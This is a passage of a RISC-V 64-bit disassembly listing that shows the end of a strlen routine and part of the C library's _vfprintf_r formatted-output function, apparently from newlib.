   107d2:	00757793          	andi	a5,a0,7
   107d6:	872a                	mv	a4,a0
   107d8:	ebb9                	bnez	a5,1082e <strlen+0x5c>
   107da:	0000f697          	auipc	a3,0xf
   107de:	c2e6b683          	ld	a3,-978(a3) # 1f408 <__SDATA_BEGIN__>
   107e2:	55fd                	li	a1,-1
   107e4:	6310                	ld	a2,0(a4)
   107e6:	0721                	addi	a4,a4,8
   107e8:	00d677b3          	and	a5,a2,a3
   107ec:	97b6                	add	a5,a5,a3
   107ee:	8fd1                	or	a5,a5,a2
   107f0:	8fd5                	or	a5,a5,a3
   107f2:	feb789e3          	beq	a5,a1,107e4 <strlen+0x12>
   107f6:	ff874683          	lbu	a3,-8(a4)
   107fa:	40a707b3          	sub	a5,a4,a0
   107fe:	c6a9                	beqz	a3,10848 <strlen+0x76>
   10800:	ff974683          	lbu	a3,-7(a4)
   10804:	ce9d                	beqz	a3,10842 <strlen+0x70>
   10806:	ffa74683          	lbu	a3,-6(a4)
   1080a:	c6a9                	beqz	a3,10854 <strlen+0x82>
   1080c:	ffb74683          	lbu	a3,-5(a4)
   10810:	ce9d                	beqz	a3,1084e <strlen+0x7c>
   10812:	ffc74683          	lbu	a3,-4(a4)
   10816:	ffd74603          	lbu	a2,-3(a4)
   1081a:	ffe74503          	lbu	a0,-2(a4)
   1081e:	ce95                	beqz	a3,1085a <strlen+0x88>
   10820:	c221                	beqz	a2,10860 <strlen+0x8e>
   10822:	00a03533          	snez	a0,a0
   10826:	953e                	add	a0,a0,a5
   10828:	1579                	addi	a0,a0,-2
   1082a:	8082                	ret
   1082c:	d6dd                	beqz	a3,107da <strlen+0x8>
   1082e:	00074783          	lbu	a5,0(a4)
   10832:	0705                	addi	a4,a4,1
   10834:	00777693          	andi	a3,a4,7
   10838:	fbf5                	bnez	a5,1082c <strlen+0x5a>
   1083a:	8f09                	sub	a4,a4,a0
   1083c:	fff70513          	addi	a0,a4,-1
   10840:	8082                	ret
   10842:	ff978513          	addi	a0,a5,-7
   10846:	8082                	ret
   10848:	ff878513          	addi	a0,a5,-8
   1084c:	8082                	ret
   1084e:	ffb78513          	addi	a0,a5,-5
   10852:	8082                	ret
   10854:	ffa78513          	addi	a0,a5,-6
   10858:	8082                	ret
   1085a:	ffc78513          	addi	a0,a5,-4
   1085e:	8082                	ret
   10860:	ffd78513          	addi	a0,a5,-3
   10864:	8082                	ret

0000000000010866 <_vfprintf_r>:
   10866:	d8010113          	addi	sp,sp,-640
   1086a:	26113c23          	sd	ra,632(sp)
   1086e:	25413823          	sd	s4,592(sp)
   10872:	25513423          	sd	s5,584(sp)
   10876:	23913423          	sd	s9,552(sp)
   1087a:	8a2e                	mv	s4,a1
   1087c:	8cb2                	mv	s9,a2
   1087e:	e836                	sd	a3,16(sp)
   10880:	26813823          	sd	s0,624(sp)
   10884:	26913423          	sd	s1,616(sp)
   10888:	27213023          	sd	s2,608(sp)
   1088c:	25313c23          	sd	s3,600(sp)
   10890:	25613023          	sd	s6,576(sp)
   10894:	23713c23          	sd	s7,568(sp)
   10898:	23813823          	sd	s8,560(sp)
   1089c:	23a13023          	sd	s10,544(sp)
   108a0:	21b13c23          	sd	s11,536(sp)
   108a4:	8aaa                	mv	s5,a0
   108a6:	2c5040ef          	jal	ra,1536a <_localeconv_r>
   108aa:	611c                	ld	a5,0(a0)
   108ac:	853e                	mv	a0,a5
   108ae:	fcbe                	sd	a5,120(sp)
   108b0:	f23ff0ef          	jal	ra,107d2 <strlen>
   108b4:	f8aa                	sd	a0,112(sp)
   108b6:	e202                	sd	zero,256(sp)
   108b8:	e602                	sd	zero,264(sp)
   108ba:	000a8663          	beqz	s5,108c6 <_vfprintf_r+0x60>
   108be:	050aa783          	lw	a5,80(s5)
   108c2:	70078063          	beqz	a5,10fc2 <_vfprintf_r+0x75c>
   108c6:	010a1703          	lh	a4,16(s4)
   108ca:	03071793          	slli	a5,a4,0x30
   108ce:	03271693          	slli	a3,a4,0x32
   108d2:	93c1                	srli	a5,a5,0x30
   108d4:	0006cf63          	bltz	a3,108f2 <_vfprintf_r+0x8c>
   108d8:	0aca2683          	lw	a3,172(s4)
   108dc:	6789                	lui	a5,0x2
   108de:	8fd9                	or	a5,a5,a4
   108e0:	7779                	lui	a4,0xffffe
   108e2:	177d                	addi	a4,a4,-1
   108e4:	8f75                	and	a4,a4,a3
   108e6:	00fa1823          	sh	a5,16(s4)
   108ea:	17c2                	slli	a5,a5,0x30
   108ec:	0aea2623          	sw	a4,172(s4)
   108f0:	93c1                	srli	a5,a5,0x30
   108f2:	0087f713          	andi	a4,a5,8
   108f6:	26070463          	beqz	a4,10b5e <_vfprintf_r+0x2f8>
   108fa:	018a3703          	ld	a4,24(s4)
   108fe:	26070063          	beqz	a4,10b5e <_vfprintf_r+0x2f8>
   10902:	8be9                	andi	a5,a5,26
   10904:	4729                	li	a4,10
   10906:	26e78963          	beq	a5,a4,10b78 <_vfprintf_r+0x312>
   1090a:	000cc783          	lbu	a5,0(s9)
   1090e:	19010b93          	addi	s7,sp,400
   10912:	ea5e                	sd	s7,272(sp)
   10914:	f202                	sd	zero,288(sp)
   10916:	10012c23          	sw	zero,280(sp)
   1091a:	f002                	sd	zero,32(sp)
   1091c:	f402                	sd	zero,40(sp)
   1091e:	e102                	sd	zero,128(sp)
   10920:	f482                	sd	zero,104(sp)
   10922:	e502                	sd	zero,136(sp)
   10924:	e902                	sd	zero,144(sp)
   10926:	e002                	sd	zero,0(sp)
   10928:	835e                	mv	t1,s7
   1092a:	4d41                	li	s10,16
   1092c:	0000c917          	auipc	s2,0xc
   10930:	e9c90913          	addi	s2,s2,-356 # 1c7c8 <zeroes.4521>
   10934:	1c078663          	beqz	a5,10b00 <_vfprintf_r+0x29a>
   10938:	8466                	mv	s0,s9
   1093a:	02500713          	li	a4,37
   1093e:	30e78463          	beq	a5,a4,10c46 <_vfprintf_r+0x3e0>
   10942:	00144783          	lbu	a5,1(s0)
   10946:	0405                	addi	s0,s0,1
   10948:	fbfd                	bnez	a5,1093e <_vfprintf_r+0xd8>
   1094a:	419404bb          	subw	s1,s0,s9
   1094e:	1a048963          	beqz	s1,10b00 <_vfprintf_r+0x29a>
   10952:	7712                	ld	a4,288(sp)
   10954:	11812783          	lw	a5,280(sp)
   10958:	01933023          	sd	s9,0(t1)
   1095c:	9726                	add	a4,a4,s1
   1095e:	2785                	addiw	a5,a5,1
   10960:	00933423          	sd	s1,8(t1)
   10964:	f23a                	sd	a4,288(sp)
   10966:	10f12c23          	sw	a5,280(sp)
   1096a:	0007871b          	sext.w	a4,a5
   1096e:	479d                	li	a5,7
   10970:	0341                	addi	t1,t1,16
   10972:	2ee7c163          	blt	a5,a4,10c54 <_vfprintf_r+0x3ee>
   10976:	6702                	ld	a4,0(sp)
   10978:	00044783          	lbu	a5,0(s0)
   1097c:	9f25                	addw	a4,a4,s1
   1097e:	e03a                	sd	a4,0(sp)
   10980:	18078063          	beqz	a5,10b00 <_vfprintf_r+0x29a>
   10984:	00144f03          	lbu	t5,1(s0)
   10988:	0c010fa3          	sb	zero,223(sp)
   1098c:	0405                	addi	s0,s0,1
   1098e:	5efd                	li	t4,-1
   10990:	4b01                	li	s6,0
   10992:	4481                	li	s1,0
   10994:	49a5                	li	s3,9
   10996:	02a00c13          	li	s8,42
   1099a:	0405                	addi	s0,s0,1
   1099c:	000f0d9b          	sext.w	s11,t5
   109a0:	05a00693          	li	a3,90
   109a4:	fe0d879b          	addiw	a5,s11,-32
   109a8:	0007871b          	sext.w	a4,a5
   109ac:	04e6e663          	bltu	a3,a4,109f8 <_vfprintf_r+0x192>
   109b0:	1782                	slli	a5,a5,0x20
   109b2:	0000c717          	auipc	a4,0xc
   109b6:	c9670713          	addi	a4,a4,-874 # 1c648 <__clzdi2+0x1d6>
   109ba:	83f9                	srli	a5,a5,0x1e
   109bc:	97ba                	add	a5,a5,a4
   109be:	439c                	lw	a5,0(a5)
   109c0:	97ba                	add	a5,a5,a4
   109c2:	8782                	jr	a5
   109c4:	4b01                	li	s6,0
   109c6:	00044703          	lbu	a4,0(s0)
   109ca:	002b179b          	slliw	a5,s6,0x2
   109ce:	01678b3b          	addw	s6,a5,s6
   109d2:	fd0d8f1b          	addiw	t5,s11,-48
   109d6:	001b1b1b          	slliw	s6,s6,0x1
   109da:	fd07079b          	addiw	a5,a4,-48
   109de:	0405                	addi	s0,s0,1
   109e0:	016f0b3b          	addw	s6,t5,s6
   109e4:	00070d9b          	sext.w	s11,a4
   109e8:	fcf9ffe3          	bgeu	s3,a5,109c6 <_vfprintf_r+0x160>
   109ec:	fe0d879b          	addiw	a5,s11,-32
   109f0:	0007871b          	sext.w	a4,a5
   109f4:	fae6fee3          	bgeu	a3,a4,109b0 <_vfprintf_r+0x14a>
   109f8:	100d8463          	beqz	s11,10b00 <_vfprintf_r+0x29a>
   109fc:	13b10423          	sb	s11,296(sp)
   10a00:	0c010fa3          	sb	zero,223(sp)
   10a04:	4985                	li	s3,1
   10a06:	4c05                	li	s8,1
   10a08:	12810c93          	addi	s9,sp,296
   10a0c:	ec02                	sd	zero,24(sp)
   10a0e:	4e81                	li	t4,0
   10a10:	e882                	sd	zero,80(sp)
   10a12:	f082                	sd	zero,96(sp)
   10a14:	ec82                	sd	zero,88(sp)
   10a16:	0024f793          	andi	a5,s1,2
   10a1a:	0007829b          	sext.w	t0,a5
   10a1e:	c391                	beqz	a5,10a22 <_vfprintf_r+0x1bc>
   10a20:	2989                	addiw	s3,s3,2
   10a22:	0844ff93          	andi	t6,s1,132
   10a26:	7792                	ld	a5,288(sp)
   10a28:	000f9663          	bnez	t6,10a34 <_vfprintf_r+0x1ce>
   10a2c:	413b06bb          	subw	a3,s6,s3
   10a30:	2cd046e3          	bgtz	a3,114fc <_vfprintf_r+0xc96>
   10a34:	0df14703          	lbu	a4,223(sp)
   10a38:	c70d                	beqz	a4,10a62 <_vfprintf_r+0x1fc>
   10a3a:	11812703          	lw	a4,280(sp)
   10a3e:	0df10693          	addi	a3,sp,223
   10a42:	00d33023          	sd	a3,0(t1)
   10a46:	2705                	addiw	a4,a4,1
   10a48:	4685                	li	a3,1
   10a4a:	0785                	addi	a5,a5,1
   10a4c:	00d33423          	sd	a3,8(t1)
   10a50:	10e12c23          	sw	a4,280(sp)
   10a54:	0007069b          	sext.w	a3,a4
   10a58:	f23e                	sd	a5,288(sp)
   10a5a:	471d                	li	a4,7
   10a5c:	0341                	addi	t1,t1,16
   10a5e:	42d74863          	blt	a4,a3,10e8e <_vfprintf_r+0x628>
   10a62:	02028563          	beqz	t0,10a8c <_vfprintf_r+0x226>
   10a66:	11812703          	lw	a4,280(sp)
   10a6a:	1194                	addi	a3,sp,224
   10a6c:	00d33023          	sd	a3,0(t1)
   10a70:	2705                	addiw	a4,a4,1
   10a72:	4689                	li	a3,2
   10a74:	0789                	addi	a5,a5,2
   10a76:	00d33423          	sd	a3,8(t1)
   10a7a:	10e12c23          	sw	a4,280(sp)
   10a7e:	0007069b          	sext.w	a3,a4
   10a82:	f23e                	sd	a5,288(sp)
   10a84:	471d                	li	a4,7
   10a86:	0341                	addi	t1,t1,16
   10a88:	30d74ce3          	blt	a4,a3,115a0 <_vfprintf_r+0xd3a>
   10a8c:	08000713          	li	a4,128
   10a90:	06ef81e3          	beq	t6,a4,112f2 <_vfprintf_r+0xa8c>
   10a94:	418e8ebb          	subw	t4,t4,s8
   10a98:	0fd043e3          	bgtz	t4,1137e <_vfprintf_r+0xb18>
   10a9c:	1004f713          	andi	a4,s1,256
   10aa0:	78071663          	bnez	a4,1122c <_vfprintf_r+0x9c6>
   10aa4:	11812703          	lw	a4,280(sp)
   10aa8:	97e2                	add	a5,a5,s8
   10aaa:	01933023          	sd	s9,0(t1)
   10aae:	0017069b          	addiw	a3,a4,1
   10ab2:	8736                	mv	a4,a3
   10ab4:	01833423          	sd	s8,8(t1)
   10ab8:	10e12c23          	sw	a4,280(sp)
   10abc:	f23e                	sd	a5,288(sp)
   10abe:	471d                	li	a4,7
   10ac0:	44d74963          	blt	a4,a3,10f12 <_vfprintf_r+0x6ac>
   10ac4:	0341                	addi	t1,t1,16
   10ac6:	8891                	andi	s1,s1,4
   10ac8:	c489                	beqz	s1,10ad2 <_vfprintf_r+0x26c>
   10aca:	413b04bb          	subw	s1,s6,s3
   10ace:	2e9048e3          	bgtz	s1,115be <_vfprintf_r+0xd58>
   10ad2:	875a                	mv	a4,s6
   10ad4:	013b5363          	bge	s6,s3,10ada <_vfprintf_r+0x274>
   10ad8:	874e                	mv	a4,s3
   10ada:	6682                	ld	a3,0(sp)
   10adc:	9f35                	addw	a4,a4,a3
   10ade:	e03a                	sd	a4,0(sp)
   10ae0:	10079ce3          	bnez	a5,113f8 <_vfprintf_r+0xb92>
   10ae4:	67e2                	ld	a5,24(sp)
   10ae6:	10012c23          	sw	zero,280(sp)
   10aea:	c789                	beqz	a5,10af4 <_vfprintf_r+0x28e>
   10aec:	65e2                	ld	a1,24(sp)
   10aee:	8556                	mv	a0,s5
   10af0:	144020ef          	jal	ra,12c34 <_free_r>
   10af4:	835e                	mv	t1,s7
   10af6:	8ca2                	mv	s9,s0
   10af8:	000cc783          	lbu	a5,0(s9)
   10afc:	e2079ee3          	bnez	a5,10938 <_vfprintf_r+0xd2>
   10b00:	7792                	ld	a5,288(sp)
   10b02:	c399                	beqz	a5,10b08 <_vfprintf_r+0x2a2>
   10b04:	2de0106f          	j	11de2 <_vfprintf_r+0x157c>
   10b08:	010a5783          	lhu	a5,16(s4)
   10b0c:	0407f793          	andi	a5,a5,64
   10b10:	c399                	beqz	a5,10b16 <_vfprintf_r+0x2b0>
   10b12:	67c0106f          	j	1218e <_vfprintf_r+0x1928>
   10b16:	27813083          	ld	ra,632(sp)
   10b1a:	27013403          	ld	s0,624(sp)
   10b1e:	6502                	ld	a0,0(sp)
   10b20:	26813483          	ld	s1,616(sp)
   10b24:	26013903          	ld	s2,608(sp)
   10b28:	25813983          	ld	s3,600(sp)
   10b2c:	25013a03          	ld	s4,592(sp)
   10b30:	24813a83          	ld	s5,584(sp)
   10b34:	24013b03          	ld	s6,576(sp)
   10b38:	23813b83          	ld	s7,568(sp)
   10b3c:	23013c03          	ld	s8,560(sp)
   10b40:	22813c83          	ld	s9,552(sp)
   10b44:	22013d03          	ld	s10,544(sp)
   10b48:	21813d83          	ld	s11,536(sp)
   10b4c:	28010113          	addi	sp,sp,640
   10b50:	8082                	ret
   10b52:	0104e493          	ori	s1,s1,16
   10b56:	00044f03          	lbu	t5,0(s0)
   10b5a:	2481                	sext.w	s1,s1
   10b5c:	bd3d                	j	1099a <_vfprintf_r+0x134>
   10b5e:	85d2                	mv	a1,s4
   10b60:	8556                	mv	a0,s5
   10b62:	1c1010ef          	jal	ra,12522 <__swsetup_r>
   10b66:	c119                	beqz	a0,10b6c <_vfprintf_r+0x306>
   10b68:	6260106f          	j	1218e <_vfprintf_r+0x1928>
   10b6c:	010a5783          	lhu	a5,16(s4)
   10b70:	4729                	li	a4,10
   10b72:	8be9                	andi	a5,a5,26
   10b74:	d8e79be3          	bne	a5,a4,1090a <_vfprintf_r+0xa4>
   10b78:	012a1783          	lh	a5,18(s4)
   10b7c:	d807c7e3          	bltz	a5,1090a <_vfprintf_r+0xa4>
   10b80:	66c2                	ld	a3,16(sp)
   10b82:	8666                	mv	a2,s9
   10b84:	85d2                	mv	a1,s4
   10b86:	8556                	mv	a0,s5
   10b88:	107010ef          	jal	ra,1248e <__sbprintf>
   10b8c:	e02a                	sd	a0,0(sp)
   10b8e:	b761                	j	10b16 <_vfprintf_r+0x2b0>
   10b90:	0104e493          	ori	s1,s1,16
   10b94:	2481                	sext.w	s1,s1
   10b96:	66c2                	ld	a3,16(sp)
   10b98:	0204f793          	andi	a5,s1,32
   10b9c:	00868713          	addi	a4,a3,8
   10ba0:	3a078263          	beqz	a5,10f44 <_vfprintf_r+0x6de>
   10ba4:	629c                	ld	a5,0(a3)
   10ba6:	89be                	mv	s3,a5
   10ba8:	3a07cc63          	bltz	a5,10f60 <_vfprintf_r+0x6fa>
   10bac:	57fd                	li	a5,-1
   10bae:	48fe87e3          	beq	t4,a5,1183c <_vfprintf_r+0xfd6>
   10bb2:	f7f4f493          	andi	s1,s1,-129
   10bb6:	e83a                	sd	a4,16(sp)
   10bb8:	0004881b          	sext.w	a6,s1
   10bbc:	120993e3          	bnez	s3,114e2 <_vfprintf_r+0xc7c>
   10bc0:	120e94e3          	bnez	t4,114e8 <_vfprintf_r+0xc82>
   10bc4:	84c2                	mv	s1,a6
   10bc6:	4e81                	li	t4,0
   10bc8:	4c01                	li	s8,0
   10bca:	18c10c93          	addi	s9,sp,396
   10bce:	000c099b          	sext.w	s3,s8
   10bd2:	01dc5463          	bge	s8,t4,10bda <_vfprintf_r+0x374>
   10bd6:	000e899b          	sext.w	s3,t4
   10bda:	0df14783          	lbu	a5,223(sp)
   10bde:	ec02                	sd	zero,24(sp)
   10be0:	e882                	sd	zero,80(sp)
   10be2:	f082                	sd	zero,96(sp)
   10be4:	ec82                	sd	zero,88(sp)
   10be6:	e20788e3          	beqz	a5,10a16 <_vfprintf_r+0x1b0>
   10bea:	2985                	addiw	s3,s3,1
   10bec:	b52d                	j	10a16 <_vfprintf_r+0x1b0>
   10bee:	0104e493          	ori	s1,s1,16
   10bf2:	2481                	sext.w	s1,s1
   10bf4:	66c2                	ld	a3,16(sp)
   10bf6:	0204f793          	andi	a5,s1,32
   10bfa:	00868713          	addi	a4,a3,8
   10bfe:	32078463          	beqz	a5,10f26 <_vfprintf_r+0x6c0>
   10c02:	0006b983          	ld	s3,0(a3)
   10c06:	bff4f493          	andi	s1,s1,-1025
   10c0a:	0004881b          	sext.w	a6,s1
   10c0e:	e83a                	sd	a4,16(sp)
   10c10:	4781                	li	a5,0
   10c12:	0c010fa3          	sb	zero,223(sp)
   10c16:	577d                	li	a4,-1
   10c18:	36ee8063          	beq	t4,a4,10f78 <_vfprintf_r+0x712>
   10c1c:	f7f87493          	andi	s1,a6,-129
   10c20:	2481                	sext.w	s1,s1
   10c22:	0a099ce3          	bnez	s3,114da <_vfprintf_r+0xc74>
   10c26:	5c0e9663          	bnez	t4,111f2 <_vfprintf_r+0x98c>
   10c2a:	ffd1                	bnez	a5,10bc6 <_vfprintf_r+0x360>
   10c2c:	00187c13          	andi	s8,a6,1
   10c30:	18c10c93          	addi	s9,sp,396
   10c34:	f80c0de3          	beqz	s8,10bce <_vfprintf_r+0x368>
   10c38:	03000793          	li	a5,48
   10c3c:	18f105a3          	sb	a5,395(sp)
   10c40:	18b10c93          	addi	s9,sp,395
   10c44:	b769                	j	10bce <_vfprintf_r+0x368>
   10c46:	419404bb          	subw	s1,s0,s9
   10c4a:	d00494e3          	bnez	s1,10952 <_vfprintf_r+0xec>
   10c4e:	00044783          	lbu	a5,0(s0)
   10c52:	b33d                	j	10980 <_vfprintf_r+0x11a>
   10c54:	0a10                	addi	a2,sp,272
   10c56:	85d2                	mv	a1,s4
   10c58:	8556                	mv	a0,s5
   10c5a:	1ca080ef          	jal	ra,18e24 <__sprint_r>
   10c5e:	ea0515e3          	bnez	a0,10b08 <_vfprintf_r+0x2a2>
   10c62:	835e                	mv	t1,s7
   10c64:	bb09                	j	10976 <_vfprintf_r+0x110>
   10c66:	0084f793          	andi	a5,s1,8
   10c6a:	3a079ee3          	bnez	a5,11826 <_vfprintf_r+0xfc0>
   10c6e:	67c2                	ld	a5,16(sp)
   10c70:	ec1a                	sd	t1,24(sp)
   10c72:	e476                	sd	t4,8(sp)
   10c74:	2388                	fld	fa0,0(a5)
   10c76:	00878693          	addi	a3,a5,8 # 2008 <register_fini-0xe0a8>
   10c7a:	e836                	sd	a3,16(sp)
   10c7c:	5040b0ef          	jal	ra,1c180 <__extenddftf2>
   10c80:	6362                	ld	t1,24(sp)
   10c82:	6ea2                	ld	t4,8(sp)
   10c84:	e22a                	sd	a0,256(sp)
   10c86:	e62e                	sd	a1,264(sp)
   10c88:	0208                	addi	a0,sp,256
   10c8a:	ec1a                	sd	t1,24(sp)
   10c8c:	e476                	sd	t4,8(sp)
   10c8e:	6a0040ef          	jal	ra,1532e <_ldcheck>
   10c92:	d5aa                	sw	a0,232(sp)
   10c94:	4789                	li	a5,2
   10c96:	6ea2                	ld	t4,8(sp)
   10c98:	6362                	ld	t1,24(sp)
   10c9a:	64f502e3          	beq	a0,a5,11ade <_vfprintf_r+0x1278>
   10c9e:	4785                	li	a5,1
   10ca0:	6ef50ee3          	beq	a0,a5,11b9c <_vfprintf_r+0x1336>
   10ca4:	06100793          	li	a5,97
   10ca8:	00fd9463          	bne	s11,a5,10cb0 <_vfprintf_r+0x44a>
   10cac:	5740106f          	j	12220 <_vfprintf_r+0x19ba>
   10cb0:	04100793          	li	a5,65
   10cb4:	00fd9463          	bne	s11,a5,10cbc <_vfprintf_r+0x456>
   10cb8:	1380106f          	j	11df0 <_vfprintf_r+0x158a>
   10cbc:	fdfdf713          	andi	a4,s11,-33
   10cc0:	57fd                	li	a5,-1
   10cc2:	f0ba                	sd	a4,96(sp)
   10cc4:	00fe9463          	bne	t4,a5,10ccc <_vfprintf_r+0x466>
   10cc8:	6140106f          	j	122dc <_vfprintf_r+0x1a76>
   10ccc:	04700793          	li	a5,71
   10cd0:	00f71463          	bne	a4,a5,10cd8 <_vfprintf_r+0x472>
   10cd4:	5c40106f          	j	12298 <_vfprintf_r+0x1a32>
   10cd8:	69b2                	ld	s3,264(sp)
   10cda:	1004e793          	ori	a5,s1,256
   10cde:	ed26                	sd	s1,152(sp)
   10ce0:	6c12                	ld	s8,256(sp)
   10ce2:	2781                	sext.w	a5,a5
   10ce4:	0009d463          	bgez	s3,10cec <_vfprintf_r+0x486>
   10ce8:	67a0106f          	j	12362 <_vfprintf_r+0x1afc>
   10cec:	e582                	sd	zero,200(sp)
   10cee:	84be                	mv	s1,a5
   10cf0:	ec02                	sd	zero,24(sp)
   10cf2:	2701                	sext.w	a4,a4
   10cf4:	04600793          	li	a5,70
   10cf8:	00f71463          	bne	a4,a5,10d00 <_vfprintf_r+0x49a>
   10cfc:	38a0106f          	j	12086 <_vfprintf_r+0x1820>
   10d00:	7706                	ld	a4,96(sp)
   10d02:	04500793          	li	a5,69
   10d06:	00f70463          	beq	a4,a5,10d0e <_vfprintf_r+0x4a8>
   10d0a:	33c0106f          	j	12046 <_vfprintf_r+0x17e0>
   10d0e:	001e871b          	addiw	a4,t4,1
   10d12:	0f810893          	addi	a7,sp,248
   10d16:	0ec10813          	addi	a6,sp,236
   10d1a:	11bc                	addi	a5,sp,232
   10d1c:	4689                	li	a3,2
   10d1e:	85e2                	mv	a1,s8
   10d20:	864e                	mv	a2,s3
   10d22:	8556                	mv	a0,s5
   10d24:	f81a                	sd	t1,48(sp)
   10d26:	f076                	sd	t4,32(sp)
   10d28:	e43a                	sd	a4,8(sp)
   10d2a:	78c030ef          	jal	ra,144b6 <_ldtoa_r>
   10d2e:	6722                	ld	a4,8(sp)
   10d30:	7e82                	ld	t4,32(sp)
   10d32:	7342                	ld	t1,48(sp)
   10d34:	8caa                	mv	s9,a0
   10d36:	00e508b3          	add	a7,a0,a4
   10d3a:	4601                	li	a2,0
   10d3c:	4681                	li	a3,0
   10d3e:	8562                	mv	a0,s8
   10d40:	85ce                	mv	a1,s3
   10d42:	f846                	sd	a7,48(sp)
   10d44:	f01a                	sd	t1,32(sp)
   10d46:	e476                	sd	t4,8(sp)
   10d48:	3540a0ef          	jal	ra,1b09c <__eqtf2>
   10d4c:	78c2                	ld	a7,48(sp)
   10d4e:	6ea2                	ld	t4,8(sp)
   10d50:	7302                	ld	t1,32(sp)
   10d52:	87c6                	mv	a5,a7
   10d54:	cd11                	beqz	a0,10d70 <_vfprintf_r+0x50a>
   10d56:	77ee                	ld	a5,248(sp)
   10d58:	0117fc63          	bgeu	a5,a7,10d70 <_vfprintf_r+0x50a>
   10d5c:	03000693          	li	a3,48
   10d60:	00178713          	addi	a4,a5,1
   10d64:	fdba                	sd	a4,248(sp)
   10d66:	00d78023          	sb	a3,0(a5)
   10d6a:	77ee                	ld	a5,248(sp)
   10d6c:	ff17eae3          	bltu	a5,a7,10d60 <_vfprintf_r+0x4fa>
   10d70:	419787bb          	subw	a5,a5,s9
   10d74:	f03e                	sd	a5,32(sp)
   10d76:	572e                	lw	a4,232(sp)
   10d78:	04700793          	li	a5,71
   10d7c:	ecba                	sd	a4,88(sp)
   10d7e:	7706                	ld	a4,96(sp)
   10d80:	00f71463          	bne	a4,a5,10d88 <_vfprintf_r+0x522>
   10d84:	2200106f          	j	11fa4 <_vfprintf_r+0x173e>
   10d88:	7706                	ld	a4,96(sp)
   10d8a:	04600793          	li	a5,70
   10d8e:	00f71463          	bne	a4,a5,10d96 <_vfprintf_r+0x530>
   10d92:	3c40106f          	j	12156 <_vfprintf_r+0x18f0>
   10d96:	67e6                	ld	a5,88(sp)
   10d98:	7586                	ld	a1,96(sp)
   10d9a:	04100613          	li	a2,65
   10d9e:	37fd                	addiw	a5,a5,-1
   10da0:	d5be                	sw	a5,232(sp)
   10da2:	0ffdf713          	andi	a4,s11,255
   10da6:	4681                	li	a3,0
   10da8:	00c59663          	bne	a1,a2,10db4 <_vfprintf_r+0x54e>
   10dac:	273d                	addiw	a4,a4,15
   10dae:	0ff77713          	andi	a4,a4,255
   10db2:	4685                	li	a3,1
   10db4:	0ee10823          	sb	a4,240(sp)
   10db8:	02b00713          	li	a4,43
   10dbc:	0007d763          	bgez	a5,10dca <_vfprintf_r+0x564>
   10dc0:	6766                	ld	a4,88(sp)
   10dc2:	4785                	li	a5,1
   10dc4:	9f99                	subw	a5,a5,a4
   10dc6:	02d00713          	li	a4,45
   10dca:	0ee108a3          	sb	a4,241(sp)
   10dce:	4725                	li	a4,9
   10dd0:	00f74463          	blt	a4,a5,10dd8 <_vfprintf_r+0x572>
   10dd4:	5e00106f          	j	123b4 <_vfprintf_r+0x1b4e>
   10dd8:	0ff10513          	addi	a0,sp,255
   10ddc:	85aa                	mv	a1,a0
   10dde:	46a9                	li	a3,10
   10de0:	06300e93          	li	t4,99
   10de4:	02d7e73b          	remw	a4,a5,a3
   10de8:	862e                	mv	a2,a1
   10dea:	88be                	mv	a7,a5
   10dec:	15fd                	addi	a1,a1,-1
   10dee:	0307071b          	addiw	a4,a4,48
   10df2:	fee60fa3          	sb	a4,-1(a2)
   10df6:	02d7c7bb          	divw	a5,a5,a3
   10dfa:	ff1ec5e3          	blt	t4,a7,10de4 <_vfprintf_r+0x57e>
   10dfe:	0307879b          	addiw	a5,a5,48
   10e02:	0ff7f693          	andi	a3,a5,255
   10e06:	fed58fa3          	sb	a3,-1(a1)
   10e0a:	ffe60793          	addi	a5,a2,-2
   10e0e:	00a7e463          	bltu	a5,a0,10e16 <_vfprintf_r+0x5b0>
   10e12:	6560106f          	j	12468 <_vfprintf_r+0x1c02>
   10e16:	0f210713          	addi	a4,sp,242
   10e1a:	a019                	j	10e20 <_vfprintf_r+0x5ba>
   10e1c:	0007c683          	lbu	a3,0(a5)
   10e20:	00d70023          	sb	a3,0(a4)
   10e24:	0785                	addi	a5,a5,1
   10e26:	0705                	addi	a4,a4,1
   10e28:	fea79ae3          	bne	a5,a0,10e1c <_vfprintf_r+0x5b6>
   10e2c:	10110793          	addi	a5,sp,257
   10e30:	0f210713          	addi	a4,sp,242
   10e34:	8f91                	sub	a5,a5,a2
   10e36:	97ba                	add	a5,a5,a4
   10e38:	1998                	addi	a4,sp,240
   10e3a:	9f99                	subw	a5,a5,a4
   10e3c:	e13e                	sd	a5,128(sp)
   10e3e:	678a                	ld	a5,128(sp)
   10e40:	7682                	ld	a3,32(sp)
   10e42:	4705                	li	a4,1
   10e44:	00f68c3b          	addw	s8,a3,a5
   10e48:	87e2                	mv	a5,s8
   10e4a:	00d74463          	blt	a4,a3,10e52 <_vfprintf_r+0x5ec>
   10e4e:	5a00106f          	j	123ee <_vfprintf_r+0x1b88>
   10e52:	7746                	ld	a4,112(sp)
   10e54:	00e78c3b          	addw	s8,a5,a4
   10e58:	67ea                	ld	a5,152(sp)
   10e5a:	fffc4993          	not	s3,s8
   10e5e:	43f9d993          	srai	s3,s3,0x3f
   10e62:	bff7f493          	andi	s1,a5,-1025
   10e66:	2481                	sext.w	s1,s1
   10e68:	013c79b3          	and	s3,s8,s3
   10e6c:	1004e493          	ori	s1,s1,256
   10e70:	2981                	sext.w	s3,s3
   10e72:	e882                	sd	zero,80(sp)
   10e74:	f082                	sd	zero,96(sp)
   10e76:	ec82                	sd	zero,88(sp)
   10e78:	67ae                	ld	a5,200(sp)
   10e7a:	e399                	bnez	a5,10e80 <_vfprintf_r+0x61a>
   10e7c:	17e0106f          	j	11ffa <_vfprintf_r+0x1794>
   10e80:	02d00793          	li	a5,45
   10e84:	0cf10fa3          	sb	a5,223(sp)
   10e88:	4e81                	li	t4,0
   10e8a:	2985                	addiw	s3,s3,1
   10e8c:	b669                	j	10a16 <_vfprintf_r+0x1b0>
   10e8e:	0a10                	addi	a2,sp,272
   10e90:	85d2                	mv	a1,s4
   10e92:	8556                	mv	a0,s5
   10e94:	fc76                	sd	t4,56(sp)
   10e96:	f87e                	sd	t6,48(sp)
   10e98:	e416                	sd	t0,8(sp)
   10e9a:	78b070ef          	jal	ra,18e24 <__sprint_r>
   10e9e:	56051463          	bnez	a0,11406 <_vfprintf_r+0xba0>
   10ea2:	7792                	ld	a5,288(sp)
   10ea4:	7ee2                	ld	t4,56(sp)
   10ea6:	7fc2                	ld	t6,48(sp)
   10ea8:	62a2                	ld	t0,8(sp)
   10eaa:	835e                	mv	t1,s7
   10eac:	be5d                	j	10a62 <_vfprintf_r+0x1fc>
